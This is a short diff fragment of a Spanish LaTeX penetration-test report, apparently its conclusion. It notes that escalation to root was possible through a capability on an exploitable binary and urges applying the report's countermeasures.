+  Tras ese acceso ha sido posible la \textbf{migración al usuario 'root'} haciendo uso de una \textbf{capability} aplicada en un binario potencialmente explotable para realizar esta acción.
+
+  Se recomienda encarecidamente aplicar las contramedidas especificadas en el punto de \textbf{\hyperref[sec:contramedidas]{Contramedidas y buenas prácticas}} dado que de lo contrario el servidor podría ser comprometido poniendo así en riesgo la integridad de toda la información almacenada en este.
+
+\end{document} % Final del documento
